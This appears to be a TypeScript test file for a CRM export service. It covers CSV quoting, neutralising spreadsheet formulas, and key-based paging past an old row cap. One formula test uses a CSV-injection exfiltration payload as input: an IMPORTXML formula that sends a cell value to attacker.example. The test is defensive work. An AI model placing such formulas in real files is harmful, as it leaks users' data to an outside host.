import type { SQL } from "drizzle-orm";
import { PgDialect } from "drizzle-orm/pg-core";
import type { Db } from "../../db/drizzle.types";
import { CrmExportService, csvRow } from "./crm-export.service";

const ORG = "org-1";

describe("csvRow", () => {
  it("writes one line per record", () => {
    expect(csvRow(["Acme", "ops@acme.example"])).toBe("Acme,ops@acme.example");
  });

  /**
   * The rules people actually get wrong. Each of these silently gains a column
   * when the file is read back, which is how an export corrupts a migration.
   */
  it("quotes a value containing a comma", () => {
    expect(csvRow(["Acme, Inc"])).toBe('"Acme, Inc"');
  });

  it("doubles embedded quotes", () => {
    expect(csvRow(['The "Real" Acme'])).toBe('"The ""Real"" Acme"');
  });

  it("quotes a value containing a newline", () => {
    expect(csvRow(["line one\nline two"])).toBe('"line one\nline two"');
  });

  it("writes a custom-fields object as JSON, not [object Object]", () => {
    expect(csvRow([{ territory: "North" }])).toBe('"{""territory"":""North""}"');
  });

  it("writes dates as ISO rather than a locale string", () => {
    expect(csvRow([new Date("2026-08-25T10:00:00.000Z")])).toBe("2026-08-25T10:00:00.000Z");
  });

  it("writes an empty cell for null and undefined alike", () => {
    expect(csvRow([null, undefined, 0, false])).toBe(",,0,false");
  });

  /**
   * The rule that was missing, and the one with teeth.
   *
   * Excel and Sheets run a cell that starts with `=`, `+`, `-` or `@`. Anyone
   * who can create a party chooses its name — inbound mail creates parties from
   * sender display names — so an admin opening the export is running text an
   * attacker wrote. Quoting alone does nothing: the parser strips the quotes and
   * the cell still starts with `=`.
   */
  describe("formulas", () => {
    it("neutralises a cell a spreadsheet would execute", () => {
      expect(csvRow(["=1+1"])).toBe("\"'=1+1\"");
      expect(csvRow(["@SUM(1+1)"])).toBe("\"'@SUM(1+1)\"");
      expect(csvRow(["+1+1"])).toBe("\"'+1+1\"");
      expect(csvRow(["-1+1"])).toBe("\"'-1+1\"");
    });

    it("neutralises the leads that slip past a check for those four", () => {
      expect(csvRow(["\tcmd"])).toBe("\"'\tcmd\"");
      expect(csvRow(["\r=1+1"])).toBe("\"'\r=1+1\"");
    });

    it("neutralises an exfiltration payload rather than only quoting it", () => {
      const attack = '=IMPORTXML(CONCAT("http://attacker.example/?v=";A2);"//a")';
      const written = csvRow([attack]);

      // Quoting is what the old rule did, and it survived: the CSV parser takes
      // the quotes off and hands the spreadsheet a formula.
      expect(written.startsWith("\"'=")).toBe(true);
    });

    it("leaves a negative number alone", () => {
      // Prefixing every negative amount would corrupt the export this protects.
      expect(csvRow([-5, "-12.5", "-1e3"])).toBe("-5,-12.5,-1e3");
    });
  });
});

/** Pages of rows: a page shorter than `PAGE` ends a stream. */
function fakeDb(
  page: () => Record<string, unknown>[],
  onWhere?: (condition: SQL) => void,
): Db {
  const builder = (): Record<string, unknown> => {
    const self: Record<string, unknown> = {
      from: () => self,
      where: (condition: SQL) => {
        onWhere?.(condition);
        return self;
      },
      orderBy: () => self,
      limit: () => self,
      then: (resolve: (value: unknown) => void, reject: (error: unknown) => void) =>
        Promise.resolve()
          .then(() => page())
          .then(resolve, reject),
    };
    return self;
  };

  return { select: () => builder() } as unknown as Db;
}

async function collect(chunks: AsyncGenerator<string>): Promise<string> {
  let text = "";
  for await (const chunk of chunks) text += chunk;
  return text;
}

describe("exporting", () => {
  const twoParties = () => [
    { partyId: "p-1", name: "Acme", notes: null },
    { partyId: "p-2", name: "Globex", notes: "second" },
  ];

  it("takes its columns from the table, not from the rows it happened to get", async () => {
    const service = new CrmExportService(fakeDb(twoParties));

    const [header, ...lines] = (await collect(service.csvChunks(ORG, "parties"))).split("\n");

    // A column none of these rows carries is still in the file, so a nullable
    // field does not disappear from an export.
    expect(header?.split(",")).toContain("partyType");
    expect(lines).toHaveLength(2);
    expect(lines[0]?.split(",")).toHaveLength(header?.split(",").length ?? 0);
  });

  it("writes JSON that parses, in the envelope the rest of the API uses", async () => {
    const service = new CrmExportService(fakeDb(twoParties));

    expect(JSON.parse(await collect(service.jsonChunks(ORG, "parties")))).toEqual(twoParties());
  });

  it("writes the archive as one document keyed by entity", async () => {
    const service = new CrmExportService(fakeDb(twoParties));

    const archive = JSON.parse(await collect(service.archiveChunks(ORG))) as Record<
      string,
      unknown[]
    >;

    expect(Object.keys(archive)).toEqual(["parties", "contacts", "subjects", "activities"]);
    expect(archive.parties).toHaveLength(2);
  });

  /**
   * The export used to stop at fifty thousand rows and return what it had, so a
   * tenant with more than that got a file that looked complete. Nothing about
   * the answer depends on its size now — only how long it takes to write.
   */
  it("does not stop at the row count that used to be the ceiling", async () => {
    const PAGE = 1_000;
    const TOTAL = 52_000;
    let served = 0;

    const service = new CrmExportService(
      fakeDb(() => {
        if (served >= TOTAL) return [];
        const from = served;
        served += PAGE;
        return Array.from({ length: PAGE }, (_, index) => ({
          partyId: `p-${String(from + index).padStart(7, "0")}`,
          name: "Acme",
        }));
      }),
    );

    let lines = 0;
    for await (const chunk of service.csvChunks(ORG, "parties"))
      lines += (chunk.match(/\n/g) ?? []).length;

    expect(served).toBe(TOTAL);
    expect(lines).toBe(TOTAL);
  });

  it("walks by key rather than by offset", async () => {
    // An offset re-scans everything before it and shifts under a concurrent
    // insert, silently skipping a record. The next page starts at the last key
    // this one returned.
    const PAGE = 1_000;
    const wheres: SQL[] = [];
    let served = false;

    const service = new CrmExportService(
      fakeDb(
        () => {
          if (served) return [];
          served = true;
          return Array.from({ length: PAGE }, (_, index) => ({
            partyId: `p-${String(index).padStart(4, "0")}`,
          }));
        },
        (condition) => wheres.push(condition),
      ),
    );

    await collect(service.jsonChunks(ORG, "parties"));

    const dialect = new PgDialect();
    expect(wheres).toHaveLength(2);
    expect(dialect.sqlToQuery(wheres[0] as SQL).params).toContain("");
    expect(dialect.sqlToQuery(wheres[1] as SQL).params).toContain("p-0999");
  });
});
